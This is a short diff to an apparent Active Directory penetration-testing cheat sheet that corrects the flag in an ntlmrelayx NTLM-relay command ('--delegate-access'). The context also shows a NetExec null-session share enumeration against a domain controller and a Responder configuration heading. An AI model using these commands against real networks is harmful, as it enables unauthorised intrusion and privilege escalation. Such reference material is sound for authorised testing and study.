@@ -481,7 +481,7 @@ NetExec smb <Domain_Controller_IP> -u 'a' -p '' --shares
 
   ### NTLMRelayx delegate access
   ```shell
-  sudo python3 ntlmrelayx.py -t ldaps://<target> --delegate access
+  sudo python3 ntlmrelayx.py -t ldaps://<target> --delegate-access
   ```
 
   ### Disbale SMB and HTTP in Responder.conf
